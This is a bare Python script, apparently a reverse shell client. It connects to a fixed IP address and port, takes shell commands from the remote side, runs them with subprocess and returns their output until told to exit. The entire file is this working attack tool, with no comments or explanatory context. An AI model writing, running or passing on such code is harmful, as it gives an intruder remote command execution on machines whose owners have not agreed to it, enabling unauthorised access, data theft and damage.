import socket
import subprocess

serv_ip = '172.17.85.168'
serv_port = 9999
cli_socket = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
cli_socket.connect((serv_ip, serv_port))
while True:
    command = cli_socket.recv(1024).decode()
    if command.lower() == 'exit':
        break
    output = subprocess.getoutput(command)
    cli_socket.send(output.encode())
cli_socket.close()
